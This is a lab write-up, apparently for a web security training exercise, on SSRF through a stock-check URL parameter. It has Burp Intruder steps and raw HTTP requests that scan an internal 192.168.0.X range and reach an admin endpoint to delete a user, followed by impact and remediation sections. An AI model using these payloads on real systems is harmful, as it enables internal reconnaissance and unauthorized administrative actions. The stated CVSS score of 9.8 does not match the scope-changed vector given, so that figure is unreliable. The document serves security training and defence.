# Title: Basic SSRF Against Another Back-End System

# **Description**

The application provides a stock check feature that allows users to check the availability of products. When a user clicks the "Check stock" button, the frontend application makes a request to a backend API that fetches stock information from an internal system. The backend API uses a user-supplied URL to retrieve this information.

However, the application fails to properly validate or restrict the URLs that can be requested through the stock check feature. The `stockApi` parameter accepts any URL and makes a server-side request to that location without proper validation. This allows an attacker to perform Server-Side Request Forgery (SSRF) attacks.

In this case, the internal network contains another back-end system with an admin interface running on port 8080. The admin interface is located somewhere within the `192.168.0.X` IP range. Since the application does not restrict the URL, an attacker can use the stock check feature to scan the internal network for the admin interface.

By iterating through IP addresses in the `192.168.0.X` range (e.g., `192.168.0.1` through `192.168.0.255`), the attacker can identify which host is running the admin interface on port 8080. Once discovered, the attacker can access the admin interface and perform privileged actions, such as deleting the user Carlos.

# **Steps to Exploit**

1. Navigate to a product page on the application (e.g., a product with ID 1).
2. Click the "Check stock" button to trigger a stock check request.
3. In Burp Suite, intercept the request and observe the `POST /product/stock` request.
4. Examine the request body and notice the `stockApi` parameter containing the URL to the internal stock API.
5. Send this request to Burp Intruder for IP scanning.
6. Change the `stockApi` parameter to `http://192.168.0.1:8080/admin` (or `http://192.168.0.1:8080`).
7. Highlight the final octet of the IP address (the number `1`) and click **Add §** to add a payload position.
8. In the Payloads side panel, change the payload type to **Numbers**.
9. Set the following values:
   - **From:** `1`
   - **To:** `255`
   - **Step:** `1`
10. Click **Start attack** to begin scanning the IP range.
11. In the Intruder results, click on the **Status** column to sort by status code ascending.
12. Look for a single entry with a status code of `200` (OK) which indicates the admin interface was found.
13. Click on this successful request and send it to Burp Repeater.
14. In Burp Repeater, change the `stockApi` path to: `/admin/delete?username=carlos`.
15. Send the request to deliver the SSRF attack and delete the user.
16. The lab is solved when Carlos is successfully deleted.

# **Proof of Concept**

**Step 1 – Original stock check request:**
```
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.abc123
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock-service.example.com/api/stock/1
```

**Step 2 – Configure Intruder for IP scanning:**
```
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.abc123
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.§1§:8080/admin
```

**Step 3 – Successful scan response (status 200):**
```
HTTP/2 200 OK
Content-Type: text/html

<html>
  <body>
    <h1>Admin Panel</h1>
    <a href="/admin/delete?username=carlos">Delete Carlos</a>
  </body>
</html>
```

**Step 4 – Delete carlos via SSRF:**
```
POST /product/stock HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.abc123
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
```

# **Impact**

The SSRF vulnerability in the stock check feature has severe security implications:

**Internal Network Scanning:**
- Attackers can scan internal networks to discover running services.
- This includes administrative interfaces, databases, and other sensitive services.

**Internal Service Discovery:**
- Attackers can map the internal network architecture.
- This information can be used for further attacks.

**Privilege Escalation:**
- Attackers can access administrative interfaces that are only available internally.
- This allows performing privileged actions like user deletion.

**Data Exposure:**
- Internal services may expose sensitive information.
- This can include configuration files, credentials, and user data.

**System Compromise:**
- Access to internal services may lead to complete system compromise.
- This includes file uploads, command execution, and database manipulation.

**Cloud Environment Risks:**
- In cloud environments, SSRF can access metadata services (e.g., AWS metadata at `169.254.169.254`).
- This can expose cloud credentials and lead to cloud account compromise.

# **Mitigation / Remediation**

1. **Validate and Sanitize URLs:**
   - Validate that the URL is a legitimate internal service URL.
   - Use whitelisting to restrict allowed URLs and domains.

2. **Implement URL Allowlisting:**
   - Only allow URLs that match a specific pattern (e.g., `http://stock-service.example.com/*`).
   - Reject any URLs that contain internal IPs or `localhost`.

3. **Restrict Internal Access:**
   - Limit the internal services that can be accessed from the application.
   - Use network segmentation to isolate internal services.

4. **Implement Access Controls:**
   - Require authentication for internal services.
   - Use different credentials for internal and external access.

5. **Disable URL Redirection:**
   - Prevent the application from following redirects.
   - Validate the final URL before making the request.

6. **Regular Security Audits:**
   - Conduct regular penetration testing to identify SSRF vulnerabilities.
   - Review all internal service access patterns.

# **CVSS Justification**

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | Exploited remotely via standard HTTP requests |
| Attack Complexity | Low | Scanning IP ranges requires minimal technical skill |
| Privileges Required | None | No authentication is required for the stock check |
| User Interaction | None | The exploit works without user interaction |
| Scope | Changed | Attacker gains access to internal systems |
| Confidentiality Impact | High | Internal services and data are exposed |
| Integrity Impact | High | The attacker can perform administrative actions |
| Availability Impact | High | User accounts can be deleted or modified |

**CVSS Score: 9.8 (Critical)**

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

This critical score reflects the severe nature of the vulnerability, which allows complete access to internal systems and administrative functions with minimal effort and no authentication requirements.